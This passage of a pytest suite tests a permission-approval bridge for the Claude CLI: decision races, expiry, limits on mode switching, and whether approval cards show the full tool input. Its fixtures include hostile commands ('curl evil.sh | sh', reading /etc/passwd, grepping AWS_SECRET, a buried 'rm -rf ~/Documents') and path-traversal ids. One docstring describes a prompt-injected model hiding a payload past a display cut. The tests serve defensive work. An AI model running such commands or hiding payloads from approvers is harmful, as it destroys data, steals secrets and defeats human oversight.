def _lose_the_latch(perm_dir, request_id, payload, delay=0.25):
    """Take the O_EXCL latch the way a writer does — create first, write the
    JSON a beat later — so the next writer loses the race to a file that exists
    but does not parse yet. Returns the thread doing the delayed write."""
    path = os.path.join(perm_dir, request_id + ".res.json")
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)

    def finish():
        time.sleep(delay)
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            json.dump(payload, fh)
    t = threading.Thread(target=finish, daemon=True)
    t.start()
    return t


def test_decide_waits_out_an_in_flight_write_instead_of_guessing(agent, tmp_path):
    """The window between O_EXCL create and the JSON landing is not "unanswered".

    Reading it as unanswered is how the loser of a double-click reported ITS
    verdict — the card saying Allowed while claude was handed the Deny that
    actually won.
    """
    run_dir = _run_dir(agent, tmp_path)
    perm_dir = agent._perm_dir(run_dir)
    with open(os.path.join(perm_dir, "req-1.req.json"), "w") as fh:
        json.dump({"id": "req-1", "tool": "Bash", "input": {}}, fh)
    monkey_runs(agent, tmp_path)
    monkeypatch_alive(agent)

    t = _lose_the_latch(perm_dir, "req-1", {"decision": "deny", "scope": "once"})
    out = agent._decide("run", "req-1", "allow", "session")
    t.join(timeout=5)
    assert out["decision"] == "deny", "reported the click, not the winner"
    assert agent._permissions(run_dir)[0]["decision"] == "deny"


def test_decide_reports_an_error_when_no_write_survives(agent, tmp_path):
    run_dir = _run_dir(agent, tmp_path)
    perm_dir = agent._perm_dir(run_dir)
    with open(os.path.join(perm_dir, "req-1.req.json"), "w") as fh:
        json.dump({"id": "req-1", "tool": "Bash", "input": {}}, fh)
    monkey_runs(agent, tmp_path)
    agent.DECISION_WRITE_WINDOW = 0.2  # don't sit through the real window

    # A latch taken by a writer that then died: the file exists, holds the
    # latch, and will never parse.
    os.close(os.open(os.path.join(perm_dir, "req-1.res.json"),
                     os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600))
    assert agent._decide("run", "req-1", "allow", "once") == {
        "error": "could not record that decision"}


def test_a_failed_write_does_not_jam_the_latch(agent, tmp_path, monkeypatch):
    """A write that dies after the create must release the file it claimed —
    an empty one holds the latch forever while never parsing, so the request
    could no longer be answered by anyone."""
    run_dir = _run_dir(agent, tmp_path)
    perm_dir = agent._perm_dir(run_dir)

    real_fdopen = os.fdopen

    def boom(fd, *a, **kw):
        real_fdopen(fd, *a, **kw).close()
        raise OSError("disk full")

    monkeypatch.setattr(agent.os, "fdopen", boom)
    assert not agent._write_decision(perm_dir, "req-1", {"decision": "allow"})
    assert not os.path.exists(os.path.join(perm_dir, "req-1.res.json"))

    monkeypatch.undo()
    assert agent._write_decision(perm_dir, "req-1", {"decision": "allow"})
    assert agent._read_decision(perm_dir, "req-1")["decision"] == "allow"


def test_read_decision_does_not_block_the_poll_path(agent, tmp_path):
    """`poll` runs every 400 ms and must never sit on a partial file — it
    reports the request as still pending and the next tick corrects it."""
    run_dir = _run_dir(agent, tmp_path)
    perm_dir = agent._perm_dir(run_dir)
    os.close(os.open(os.path.join(perm_dir, "req-1.res.json"),
                     os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600))
    started = time.monotonic()
    assert agent._read_decision(perm_dir, "req-1") == {}
    assert time.monotonic() - started < 0.5


def test_server_timeout_yields_to_a_click_landing_in_the_same_instant(tmp_path):
    """The sharp end of the same bug: here a misread reaches CLAUDE, denying a
    tool the user allowed."""
    perm_dir = tmp_path / "perm"
    s = _Server(perm_dir, env={"FUSED_RENDER_PERMISSION_TIMEOUT": "1"})
    try:
        s.call("initialize", {"protocolVersion": "2025-06-18", "capabilities": {}})
        pending = s.send_async("tools/call", {
            "name": "approve",
            "arguments": {"tool_name": "Bash", "input": {"command": "ls"}}})
        req = _wait_for_request(perm_dir)

        # Claim the latch just as the server's own wait expires, and let the
        # JSON land a beat later — exactly the shape of a click racing the
        # timeout.
        time.sleep(0.9)
        t = _lose_the_latch(str(perm_dir), req["id"],
                            {"decision": "allow", "scope": "once"}, delay=0.4)
        payload = _result_payload(pending.result(20))
        t.join(timeout=5)
        assert payload["behavior"] == "allow", (
            "the server denied a request the user had allowed")
    finally:
        s.close()


@pytest.mark.parametrize("decision", ["deny", "", "Allow", "allow ", "yes", "1"])
def test_only_the_exact_string_allow_grants(agent, tmp_path, decision):
    run_dir = _run_dir(agent, tmp_path)
    with open(os.path.join(agent._perm_dir(run_dir), "req-1.req.json"), "w") as fh:
        json.dump({"id": "req-1", "tool": "Bash", "input": {}}, fh)
    monkey_runs(agent, tmp_path)
    monkeypatch_alive(agent)
    assert agent._decide("run", "req-1", decision, "session")["decision"] == "deny"


@pytest.mark.parametrize("bad", ["../../etc", "a/b", "a\\b", ".hidden", ""])
def test_traversal_ids_are_refused(agent, tmp_path, bad):
    run_dir = _run_dir(agent, tmp_path)
    with open(os.path.join(agent._perm_dir(run_dir), "req-1.req.json"), "w") as fh:
        json.dump({"id": "req-1", "tool": "Bash", "input": {}}, fh)
    monkey_runs(agent, tmp_path)
    assert "error" in agent._decide("run", bad, "allow", "once")
    assert "error" in agent._decide(bad, "req-1", "allow", "once")


def test_decide_refuses_a_request_that_was_never_raised(agent, tmp_path):
    _run_dir(agent, tmp_path)
    monkey_runs(agent, tmp_path)
    assert agent._decide("run", "made-up", "allow", "once") == {
        "error": "unknown permission request"}


def test_cancel_releases_every_parked_request(agent, tmp_path):
    run_dir = _run_dir(agent, tmp_path)
    perm_dir = agent._perm_dir(run_dir)
    for n in ("a", "b"):
        with open(os.path.join(perm_dir, "req-%s.req.json" % n), "w") as fh:
            json.dump({"id": "req-" + n, "tool": "Bash", "input": {}}, fh)
    with open(os.path.join(run_dir, "pid"), "w") as fh:
        fh.write("-1")  # no such pgid; _cancel swallows the failed kill
    monkey_runs(agent, tmp_path)

    agent._cancel("run")
    assert [p["decision"] for p in agent._permissions(run_dir)] == ["deny", "deny"]


def test_poll_marks_an_unanswered_request_expired_once_the_run_is_over(agent, tmp_path):
    run_dir = _run_dir(agent, tmp_path)
    with open(os.path.join(agent._perm_dir(run_dir), "req-1.req.json"), "w") as fh:
        json.dump({"id": "req-1", "tool": "Bash", "input": {}}, fh)
    with open(os.path.join(run_dir, "out.jsonl"), "w") as fh:
        fh.write(json.dumps({"type": "result", "session_id": "s", "result": "done"}) + "\n")
    monkey_runs(agent, tmp_path)

    data = agent._poll("run")
    assert data["done"]
    # Not "pending": the run that was waiting on it is gone, so the buttons
    # would lead nowhere.
    assert data["permissions"][0]["decision"] == "expired"


def _dead_run_with_a_parked_request(agent, tmp_path, finished=True):
    """A run that is over — result row written, process gone — with one
    permission request nobody ever answered."""
    run_dir = _run_dir(agent, tmp_path)
    with open(os.path.join(agent._perm_dir(run_dir), "req-1.req.json"), "w") as fh:
        json.dump({"id": "req-1", "tool": "Bash", "input": {"command": "ls"}}, fh)
    if finished:
        with open(os.path.join(run_dir, "out.jsonl"), "w") as fh:
            fh.write(json.dumps({"type": "result", "session_id": "s",
                                 "result": "done"}) + "\n")
    with open(os.path.join(run_dir, "pid"), "w") as fh:
        # A real reaped pid, so the genuine _alive path runs. NOT a sentinel
        # like -1: to kill(2) that means "every process I may signal", so
        # os.kill(-1, 0) succeeds and a "dead" run reads as alive.
        done = subprocess.Popen([sys.executable, "-c", ""])
        done.wait()
        fh.write(str(done.pid))
    monkey_runs(agent, tmp_path)
    return run_dir


def test_expiry_is_latched_on_disk_not_just_labelled(agent, tmp_path):
    """`poll` marking an unanswered request expired has to WRITE that, or a
    click still in flight lands afterwards and the card claims a grant that
    never reached claude."""
    run_dir = _dead_run_with_a_parked_request(agent, tmp_path)

    assert agent._poll("run")["permissions"][0]["decision"] == "expired"
    on_disk = agent._read_decision(agent._perm_dir(run_dir), "req-1")
    assert on_disk.get("decision") == "expired", "expiry never reached the latch"

    # The in-flight Allow now loses to the latch and is told so.
    assert agent._decide("run", "req-1", "allow", "once")["decision"] == "expired"
    assert agent._read_decision(agent._perm_dir(run_dir), "req-1")["decision"] == "expired"


def test_a_click_landing_after_the_run_died_is_not_recorded_as_a_grant(agent, tmp_path):
    """The other ordering: the click arrives before any poll noticed the run
    was over. Nothing is waiting for the answer, so it must not be recorded as
    one — '✓ Allowed' for a tool claude never ran is a permission UI lying
    about the thing it exists to report."""
    run_dir = _dead_run_with_a_parked_request(agent, tmp_path, finished=False)

    out = agent._decide("run", "req-1", "allow", "session")
    assert out["decision"] == "expired", f"recorded a grant on a dead run: {out}"
    assert agent._read_decision(agent._perm_dir(run_dir), "req-1") == {
        "decision": "expired"}


def test_a_live_run_still_records_the_click(agent, tmp_path, monkeypatch):
    """The guard above must not swallow ordinary answers."""
    run_dir = _dead_run_with_a_parked_request(agent, tmp_path, finished=False)
    assert agent._decide("run", "req-1", "allow", "once")["decision"] == "expired"

    # Same request, same click — the only difference is that the run is live.
    os.unlink(os.path.join(agent._perm_dir(run_dir), "req-1.res.json"))
    monkeypatch.setattr(agent, "_alive", lambda _: True)
    out = agent._decide("run", "req-1", "allow", "once")
    assert out["decision"] == "allow", out
    # (scope stays "once" here because the fixture's request is Bash — that is
    # the allowlist's doing, covered separately.)
    assert out["scope"] == "once"


def test_poll_reports_awaiting_while_a_request_is_parked(agent, tmp_path, monkeypatch):
    run_dir = _run_dir(agent, tmp_path)
    with open(os.path.join(agent._perm_dir(run_dir), "req-1.req.json"), "w") as fh:
        json.dump({"id": "req-1", "tool": "Edit", "input": {"file_path": "/x"}}, fh)
    with open(os.path.join(run_dir, "out.jsonl"), "w") as fh:
        fh.write(json.dumps({"type": "system", "session_id": "s"}) + "\n")
    monkey_runs(agent, tmp_path)
    monkeypatch.setattr(agent, "_alive", lambda _: True)

    data = agent._poll("run")
    assert not data["done"] and data["phase"] == "awaiting"
    assert data["permissions"][0]["tool"] == "Edit"


def _run_awaiting_in_mode(agent, tmp_path, monkeypatch, spawn_mode):
    """A live run, spawned in `spawn_mode`, with one unanswered request."""
    run_dir = _run_dir(agent, tmp_path)
    with open(os.path.join(run_dir, "meta.json"), "w") as fh:
        json.dump({"file": "/x.html", "message": "hi", "resumed_from": "",
                   "mode": spawn_mode}, fh)
    with open(os.path.join(agent._perm_dir(run_dir), "req-1.req.json"), "w") as fh:
        json.dump({"id": "req-1", "tool": "Edit", "input": {"file_path": "/x"},
                   "created_at": 1000.0}, fh)
    with open(os.path.join(run_dir, "out.jsonl"), "w") as fh:
        fh.write(json.dumps({"type": "system", "session_id": "s"}) + "\n")
    monkey_runs(agent, tmp_path)
    monkeypatch.setattr(agent, "_alive", lambda _: True)
    return run_dir


@pytest.mark.parametrize("spawn_mode", ["prompt", "acceptEdits", "auto"])
def test_poll_reports_the_mode_the_run_is_actually_in(agent, tmp_path, monkeypatch,
                                                      spawn_mode):
    """The card's mode-switch button is gated on this, so it has to describe the
    RUNNING process — not the picker, which only applies to the next spawn."""
    _run_awaiting_in_mode(agent, tmp_path, monkeypatch, spawn_mode)
    assert agent._poll("run")["mode"] == spawn_mode


def test_the_live_mode_follows_a_setmode_that_reached_disk(agent, tmp_path,
                                                           monkeypatch):
    """An allow carrying `mode` re-points the running session, so every later
    card must see the new mode — otherwise the button keeps offering a switch
    that already happened."""
    run_dir = _run_awaiting_in_mode(agent, tmp_path, monkeypatch, "prompt")
    assert agent._poll("run")["mode"] == "prompt"

    out = agent._decide("run", "req-1", "allow", "once", mode="auto")
    assert out["mode"] == "auto", out
    assert agent._poll("run")["mode"] == "auto"


def test_a_denied_or_dropped_mode_switch_does_not_move_the_live_mode(
        agent, tmp_path, monkeypatch):
    """Only a switch claude was actually told about counts. A deny never
    carries one, and an unrecognised mode is dropped before it reaches the CLI
    — reporting either as live would hide the button while the session is
    still strict, which is the failure this whole field exists to prevent."""
    run_dir = _run_awaiting_in_mode(agent, tmp_path, monkeypatch, "prompt")
    perm_dir = agent._perm_dir(run_dir)

    # a deny that asks for a mode anyway
    agent._decide("run", "req-1", "deny", "once", mode="auto")
    assert agent._poll("run")["mode"] == "prompt"

    # an unrecognised mode, and the one mode a card may never reach
    for bad in ("bypassPermissions", "nonsense", ""):
        os.unlink(os.path.join(perm_dir, "req-1.res.json"))
        agent._decide("run", "req-1", "allow", "once", mode=bad)
        assert agent._poll("run")["mode"] == "prompt", bad


def test_the_live_mode_ignores_the_pickers_param(agent, tmp_path, monkeypatch):
    """The reported bug, at its source: the two are different facts, and only
    one of them describes the process that is currently carding."""
    _run_awaiting_in_mode(agent, tmp_path, monkeypatch, "prompt")
    # There is no way to ask agent.py about the picker — which is the point.
    # `mode` is derived from meta + the decisions on disk and nothing else.
    assert agent._poll("run")["mode"] == "prompt"
    assert agent._live_mode({"mode": "auto"}, []) == "auto"
    assert agent._live_mode({}, []) == agent.DEFAULT_PERMISSION_MODE
    assert agent._live_mode({"mode": "nonsense"}, []) == agent.DEFAULT_PERMISSION_MODE


def test_start_records_the_mode_it_spawned_with(agent, tmp_path, monkeypatch):
    target = tmp_path / "sample.html"
    target.write_text("<html></html>")
    monkeypatch.setattr(agent, "RUNS", str(tmp_path / "runs"))
    monkeypatch.setattr(agent, "_claude_bin", lambda: "/bin/claude")
    monkeypatch.setattr(agent.subprocess, "Popen",
                        lambda *a, **k: type("P", (), {"pid": 4321})())
    run_id = agent._start(str(target), "hi", "", "", "", "acceptEdits")["run_id"]
    meta = json.load(open(os.path.join(agent.RUNS, run_id, "meta.json")))
    assert meta["mode"] == "acceptEdits"


def test_malformed_request_files_are_skipped_not_fatal(agent, tmp_path):
    run_dir = _run_dir(agent, tmp_path)
    perm_dir = agent._perm_dir(run_dir)
    open(os.path.join(perm_dir, "half.req.json"), "w").write("{not json")
    with open(os.path.join(perm_dir, "esc.req.json"), "w") as fh:
        json.dump({"id": "../escape", "tool": "Bash", "input": {}}, fh)
    with open(os.path.join(perm_dir, "ok.req.json"), "w") as fh:
        json.dump({"id": "ok", "tool": "Bash", "input": {}}, fh)

    assert [p["id"] for p in agent._permissions(run_dir)] == ["ok"]


# ------------------------------------------------------------- the spawn line

def test_start_asks_the_cli_to_route_permissions_here(agent, tmp_path, monkeypatch):
    target = tmp_path / "sample.html"
    target.write_text("<html></html>")
    monkeypatch.setattr(agent, "RUNS", str(tmp_path / "runs"))
    monkeypatch.setattr(agent, "_claude_bin", lambda: "/bin/claude")
    seen = {}

    class _Proc:
        pid = 4242

    def fake_popen(cmd, **kwargs):
        seen["cmd"] = cmd
        return _Proc()

    monkeypatch.setattr(agent.subprocess, "Popen", fake_popen)
    run_id = agent._start(str(target), "hi", "", "", "")["run_id"]
    cmd = seen["cmd"]

    tool = "mcp__%s__%s" % (agent.PERMISSION_SERVER, agent.PERMISSION_TOOL)
    assert cmd[cmd.index("--permission-prompt-tool") + 1] == tool
    # acceptEdits was only ever there because headless claude could not be
    # asked; with a prompt tool wired up the default (ask) is answerable.
    assert "--permission-mode" not in cmd
    # A prompt tool un-gates AskUserQuestion and ExitPlanMode in headless mode.
    # The question card renders the first one, so it is live; the plan dialog
    # does not exist yet, so that one stays off.
    assert cmd[cmd.index("--disallowed-tools") + 1] == "ExitPlanMode"

    config = json.loads(open(cmd[cmd.index("--mcp-config") + 1]).read())
    entry = config["mcpServers"][agent.PERMISSION_SERVER]
    assert os.path.basename(entry["args"][0]) == "permission_server.py"
    assert os.path.isfile(entry["args"][0])
    assert entry["args"][1] == agent._perm_dir(os.path.join(agent.RUNS, run_id))
    # The per-call ceiling has to clear the server's own wait, or the CLI cuts
    # in first and reports an MCP timeout instead of "nobody answered".
    assert entry["timeout"] > agent.PERMISSION_WAIT * 1000
    assert entry["env"]["FUSED_RENDER_PERMISSION_TIMEOUT"] == str(agent.PERMISSION_WAIT)


def test_the_server_path_resolves_when_the_engine_execs_us_without_dunder_file(tmp_path):
    """The optional fused engine (D69) `exec`s this module into a namespace
    with no `__file__` — it only puts the script's dir first on sys.path. A
    bare `os.path.dirname(__file__)` is therefore a NameError for anyone with
    the `fused` extra installed, which is how a live chat answered a first
    message with "name '__file__' is not defined".
    """
    template_dir = os.path.abspath(TEMPLATE_DIR)
    source = open(os.path.join(template_dir, "agent.py"), encoding="utf-8").read()

    ns = {"__name__": "__fused_engine__"}
    assert "__file__" not in ns, "the point of this test is that it is absent"

    sys.path.insert(0, template_dir)  # the engine's preamble, verbatim in spirit
    try:
        exec(compile(source, os.path.join(template_dir, "agent.py"), "exec"), ns)
    finally:
        sys.path.remove(template_dir)

    run_dir = tmp_path / "run"
    os.makedirs(run_dir / "perm")
    config = json.loads(open(ns["_write_mcp_config"](str(run_dir))).read())
    server = config["mcpServers"][ns["PERMISSION_SERVER"]]["args"][0]
    assert os.path.isfile(server), f"resolved to a non-existent path: {server}"
    assert os.path.basename(server) == "permission_server.py"


def test_the_card_and_the_backend_agree_on_who_may_be_granted(agent):
    """D146: a rule duplicated across two implementations needs a test that
    asserts they agree, not a comment saying they should."""
    html = open(os.path.join(TEMPLATE_DIR, "template.html"), encoding="utf-8").read()
    listed = html.split("const WHOLE_TOOL_GRANTABLE = new Set([")[1].split("]);")[0]
    in_page = {t.strip().strip('"') for t in listed.split(",") if t.strip()}
    assert in_page == set(agent.WHOLE_TOOL_GRANTABLE)


def test_session_scope_is_refused_server_side_for_an_ungrantable_tool(agent, tmp_path):
    """The card only offers "allow all" for the file tools, but that is a view
    — and a view is the wrong place for the only copy of the rule. A `decide`
    asking for session scope on a Bash request must not install a session-wide
    Bash grant; it narrows to allow-once and says so."""
    run_dir = _run_dir(agent, tmp_path)
    for name, tool in (("req-bash", "Bash"), ("req-edit", "Edit")):
        with open(os.path.join(agent._perm_dir(run_dir), name + ".req.json"), "w") as fh:
            json.dump({"id": name, "tool": tool, "input": {}}, fh)
    monkey_runs(agent, tmp_path)
    monkeypatch_alive(agent)

    bash = agent._decide("run", "req-bash", "allow", "session")
    assert bash["decision"] == "allow" and bash["scope"] == "once", bash
    assert agent._read_decision(agent._perm_dir(run_dir), "req-bash")["scope"] == "once"

    # ...and the tools that DO carry the offer are untouched by the guard.
    edit = agent._decide("run", "req-edit", "allow", "session")
    assert edit["scope"] == "session", edit


@pytest.mark.parametrize("decision,mode,recorded", [
    ("allow", "auto", "auto"),
    ("allow", "acceptEdits", "acceptEdits"),
    ("allow", "bypassPermissions", ""),   # not switchable, dropped
    ("allow", "prompt", ""),              # tightening is the picker's job
    ("allow", "nonsense", ""),
    ("deny", "auto", ""),                 # a deny that loosened the mode is incoherent
])
def test_only_a_switchable_mode_is_recorded_and_only_alongside_an_allow(
        agent, tmp_path, decision, mode, recorded):
    run_dir = _run_dir(agent, tmp_path)
    with open(os.path.join(agent._perm_dir(run_dir), "req-1.req.json"), "w") as fh:
        json.dump({"id": "req-1", "tool": "Edit", "input": {}}, fh)
    monkey_runs(agent, tmp_path)
    monkeypatch_alive(agent)

    out = agent._decide("run", "req-1", decision, "once", mode)
    assert out["mode"] == recorded, out
    assert agent._read_decision(
        agent._perm_dir(run_dir), "req-1").get("mode", "") == recorded


def test_the_three_switchable_mode_lists_agree(agent):
    """agent.py validates it, permission_server re-validates it, and the card
    offers it — three copies, so a test holds them together (D146)."""
    assert set(agent.SWITCHABLE_MODES) == set(_load("permission_server").SWITCHABLE_MODES)
    # every switchable mode must also be a mode the picker can spawn with,
    # or a card could leave the session somewhere the next turn cannot
    assert set(agent.SWITCHABLE_MODES) <= set(agent.PERMISSION_MODES)
    assert "bypassPermissions" not in agent.SWITCHABLE_MODES

    # Every non-empty mode the card's choice table can send.
    html = open(os.path.join(TEMPLATE_DIR, "template.html"), encoding="utf-8").read()
    offered = {m for m in re.findall(r'"(?:allow|deny)", "(?:once|session)", "(\w*)"', html) if m}
    assert offered, "the card no longer offers a mode switch at all"
    assert offered <= set(agent.SWITCHABLE_MODES), offered


def test_an_unreadable_request_cannot_win_a_session_grant(agent, tmp_path):
    run_dir = _run_dir(agent, tmp_path)
    open(os.path.join(agent._perm_dir(run_dir), "req-1.req.json"), "w").write("{trunc")
    monkey_runs(agent, tmp_path)
    monkeypatch_alive(agent)
    assert agent._decide("run", "req-1", "allow", "session")["scope"] == "once"


def test_a_whole_tool_grant_is_not_offered_for_bash_and_friends(agent):
    """"Allow all Bash in this reply" hands over every command for the rest of
    the turn — not a proportionate second option next to one `gh pr diff`, and
    close to switching approvals off. Only the repeat-heavy file tools carry
    the whole-tool grant; anything unlisted (Bash, the web tools, MCP tools)
    gets Allow/Deny."""
    html = open(os.path.join(TEMPLATE_DIR, "template.html"), encoding="utf-8").read()
    listed = html.split("const WHOLE_TOOL_GRANTABLE = new Set([")[1].split("]);")[0]
    granted = {t.strip().strip('"') for t in listed.split(",") if t.strip()}
    assert granted == {"Edit", "Write", "Read", "Glob", "Grep", "NotebookEdit"}
    for tool in ("Bash", "WebFetch", "WebSearch", "Task", "mcp__other__thing"):
        assert tool not in granted
    # That the button is actually *gated* on this set — rather than the set
    # merely being declared nearby — is asserted by running the page's own
    # `permChoices`, in
    # test_the_page_offers_allow_all_only_where_the_backend_would_honour_it.
    # It used to be a substring check here, which broke the moment the gate was
    # extracted to a function: the code was still correct, the assertion was
    # just reading the wrong thing.


@pytest.mark.parametrize("env,expected", [
    ("5", 5),           # the reported case: set it to 5, get 3600 anyway
    ("120", 120),
    ("0", 3600),        # nonsense values fall back rather than giving up instantly
    ("-30", 3600),
    ("banana", 3600),
    (None, 3600),
    # int(float("inf")) raises OverflowError, which is NOT a ValueError — these
    # crashed the module at import, taking down every action in the template
    # rather than falling back the way the docstring promises.
    ("inf", 3600),
    ("-inf", 3600),
    ("nan", 3600),
    ("1e400", 3600),
    # valid but past the int32-millisecond ceiling the CLI clamps the
    # per-server MCP timeout to; a bigger number is not a longer wait
    ("99999999999", 2147423),
])
def test_permission_timeout_is_actually_configurable(tmp_path, monkeypatch, env, expected):
    """`FUSED_RENDER_PERMISSION_TIMEOUT` is read by permission_server, but
    agent.py stamps its own value into the generated mcp.json — as the
    server's env AND as the CLI's per-call ceiling. A constant here therefore
    overwrote whatever the user set, so the var documented as configurable
    silently was not."""
    if env is None:
        monkeypatch.delenv("FUSED_RENDER_PERMISSION_TIMEOUT", raising=False)
    else:
        monkeypatch.setenv("FUSED_RENDER_PERMISSION_TIMEOUT", env)
    agent = _load("agent")  # re-import: the value is resolved at module load
    assert agent.PERMISSION_WAIT == expected

    run_dir = tmp_path / "run"
    os.makedirs(run_dir / "perm")
    entry = json.loads(open(agent._write_mcp_config(str(run_dir))).read())
    entry = entry["mcpServers"][agent.PERMISSION_SERVER]
    assert entry["env"]["FUSED_RENDER_PERMISSION_TIMEOUT"] == str(expected)
    # and the CLI's hard ceiling still clears our own wait, whatever it is
    assert entry["timeout"] > expected * 1000


@pytest.mark.parametrize("picked,flag", [
    ("prompt", None),                  # CLI default — a card for everything
    ("acceptEdits", "acceptEdits"),    # edits through, Bash/web still card
    ("auto", "auto"),                  # the CLI's classifier judges each one
    ("", None),                        # unset -> strictest
    ("bypassPermissions", None),       # not on the menu, and not reachable
    ("dontAsk", None),
    ("../../etc", None),
])
def test_the_approvals_mode_reaches_the_cli_and_cannot_be_widened(
        agent, tmp_path, monkeypatch, picked, flag):
    """The selector's three modes map onto --permission-mode. Anything else
    falls back to the strictest: a mangled param must never buy more
    auto-approval than the user picked, and the CLI's blanket
    `bypassPermissions` is deliberately not offered at all."""
    target = tmp_path / "sample.html"
    target.write_text("<html></html>")
    monkeypatch.setattr(agent, "RUNS", str(tmp_path / "runs"))
    monkeypatch.setattr(agent, "_claude_bin", lambda: "/bin/claude")
    seen = {}

    class _Proc:
        pid = 4242

    monkeypatch.setattr(agent.subprocess, "Popen",
                        lambda cmd, **kw: (seen.__setitem__("cmd", cmd), _Proc())[1])
    agent._start(str(target), "hi", "", "", "", picked)
    cmd = seen["cmd"]

    if flag is None:
        assert "--permission-mode" not in cmd
    else:
        assert cmd[cmd.index("--permission-mode") + 1] == flag
    assert "bypassPermissions" not in cmd
    # the bridge stays wired whatever the mode — whatever is NOT auto-approved
    # still has to be answerable, or it is a silent refusal again
    assert "--permission-prompt-tool" in cmd


def _perm_choices(tool, live_mode):
    """Run the card's real `permChoices` and return the button texts."""
    html = open(os.path.join(TEMPLATE_DIR, "template.html"), encoding="utf-8").read()
    consts = "\n".join([
        html[html.index("const DEFAULT_PERMISSION = "):].split("\n")[0],
        html[html.index("const WHOLE_TOOL_GRANTABLE = new Set(["):
             html.index("]);", html.index("const WHOLE_TOOL_GRANTABLE")) + 3],
    ])
    start = html.index("function permChoices(")
    fn = html[start:html.index("function buildPermCard(", start)]
    script = consts + "\n" + fn + (
        "\nconsole.log(JSON.stringify(permChoices(%s, 'X', %s).map((c) => c[0])));"
        % (json.dumps(tool), json.dumps(live_mode)))
    out = subprocess.run(["node", "-e", script], capture_output=True, text=True)
    assert out.returncode == 0, out.stderr
    return json.loads(out.stdout)


_SWITCH = "Allow, and let Claude decide from here"


@pytest.mark.parametrize("live_mode", ["prompt", "acceptEdits", "", None])
def test_the_mode_switch_is_offered_while_the_run_is_still_strict(live_mode):
    """Gated on the mode the RUN is in, not the picker's param.

    Changing the picker to "Claude decides" mid-turn does not touch the running
    process — it applies to the next spawn — so the session keeps carding in
    the strict mode it was started in. Reading the param here hid this button
    at exactly that moment, which is when it is the only control that can
    deliver what the user just asked for. An absent/unknown mode still offers
    it: a needless button is a no-op click, a missing one is the bug.
    """
    if not shutil.which("node"):
        pytest.skip("node is needed to run the card's own button builder")
    assert _SWITCH in _perm_choices("Bash", live_mode)


def test_the_mode_switch_is_dropped_once_the_run_is_already_auto():
    if not shutil.which("node"):
        pytest.skip("node is needed to run the card's own button builder")
    choices = _perm_choices("Bash", "auto")
    assert _SWITCH not in choices
    assert choices == ["Allow", "Deny"]


@pytest.mark.parametrize("tool,grantable", [
    ("Edit", True), ("Write", True), ("Read", True), ("Glob", True),
    ("Grep", True), ("NotebookEdit", True),
    ("Bash", False), ("WebFetch", False), ("mcp__x__y", False),
])
def test_the_page_offers_allow_all_only_where_the_backend_would_honour_it(
        agent, tool, grantable):
    """The card's allowlist and `agent.py`'s must agree (D146) — asserted by
    running the page's own gate rather than by re-reading its source."""
    if not shutil.which("node"):
        pytest.skip("node is needed to run the card's own button builder")
    offered = any(c.startswith("Allow all ") for c in _perm_choices(tool, "prompt"))
    assert offered == grantable
    assert offered == (tool in agent.WHOLE_TOOL_GRANTABLE)


def test_the_selector_and_the_backend_offer_the_same_modes(agent):
    html = open(os.path.join(TEMPLATE_DIR, "template.html"), encoding="utf-8").read()
    listed = html.split("const PERMISSION_MODES = [")[1].split("];")[0]
    in_page = [m.strip().strip('"') for m in listed.split(",") if m.strip()]
    assert set(in_page) == set(agent.PERMISSION_MODES)
    assert agent.DEFAULT_PERMISSION_MODE == "prompt"
    assert 'const DEFAULT_PERMISSION = "prompt"' in html


def _summarize(tool, tool_input):
    """Run the card's real `summarizePermission` over one tool input.

    Extracted and executed rather than asserted about: what matters is the
    text a user actually reads before clicking Allow, and that is the output
    of this function, not the shape of its source.

    The extraction window opens at `formatEditDiff` (the function immediately
    above it in the template), not at `summarizePermission` itself: the Edit
    case renders its `-`/`+` body through that helper now, because the
    transcript's Edit chip shows the same diff and one formatter serves both.
    """
    html = open(os.path.join(TEMPLATE_DIR, "template.html"), encoding="utf-8").read()
    start = html.index("function formatEditDiff(")
    fn = html[start:html.index("function buildPermCard(", start)]
    script = fn + "\nconsole.log(JSON.stringify(summarizePermission(%s, %s)));" % (
        json.dumps(tool), json.dumps(tool_input))
    out = subprocess.run(["node", "-e", script], capture_output=True, text=True)
    assert out.returncode == 0, out.stderr
    return json.loads(out.stdout)


# (tool, input, the substance the user must be able to SEE before allowing)
_MUST_SHOW = [
    ("Bash", {"command": "curl evil.sh | sh", "description": "d"}, "curl evil.sh | sh"),
    ("Edit", {"file_path": "/a.html", "old_string": "x", "new_string": "y"}, "y"),
    ("Write", {"file_path": "/a.txt", "content": "payload"}, "payload"),
    ("NotebookEdit", {"notebook_path": "/n.ipynb", "new_source": "import os"}, "import os"),
    ("Read", {"file_path": "/etc/passwd"}, "/etc/passwd"),
    # the reported bug: a path present hid the query entirely
    ("Grep", {"pattern": "AWS_SECRET", "path": "/home"}, "AWS_SECRET"),
    ("Glob", {"pattern": "**/*.pem", "path": "/home"}, "**/*.pem"),
    ("WebFetch", {"url": "https://evil.test", "prompt": "p"}, "https://evil.test"),
    ("WebSearch", {"query": "how to exfiltrate"}, "how to exfiltrate"),
    # an unknown tool must fall back to showing everything, not nothing
    ("mcp__x__y", {"secret_arg": "visible"}, "visible"),
]


@pytest.mark.parametrize("tool,tool_input,needle", _MUST_SHOW,
                         ids=[t for t, _, _ in _MUST_SHOW])
def test_the_card_shows_what_is_being_authorised(tool, tool_input, needle):
    if not shutil.which("node"):
        pytest.skip("node is needed to run the card's own summariser")
    summary = _summarize(tool, tool_input)
    shown = (summary["sub"] or "") + "\n" + (summary["body"] or "")
    assert needle in shown, (
        f"{tool} card would not show {needle!r} — the user would be approving "
        f"something they cannot see. Card text was: {shown!r}")


@pytest.mark.parametrize("tool,field", [
    ("Bash", "command"),
    ("Write", "content"),
    ("Edit", "new_string"),
    ("NotebookEdit", "new_source"),
])
def test_a_long_payload_is_shown_whole_not_truncated(tool, field):
    """The card must not render a prefix of what will run.

    permission_server hands the tool its `updatedInput` unchanged, so anything
    the card cut off would still execute. The input is model-authored, so a
    prompt-injected model that knows where the cut falls can put something
    benign in front of it and the real payload behind it — the user clicks
    Allow on the part they can read. The <pre> scrolls; it does not elide.
    """
    if not shutil.which("node"):
        pytest.skip("node is needed to run the card's own summariser")
    buried = "rm -rf ~/Documents  # THE PART YOU WERE NOT SHOWN"
    payload = ("echo benign\n" * 400) + buried          # ~5k chars, past any cut
    summary = _summarize(tool, {"file_path": "/a", "notebook_path": "/n", field: payload})
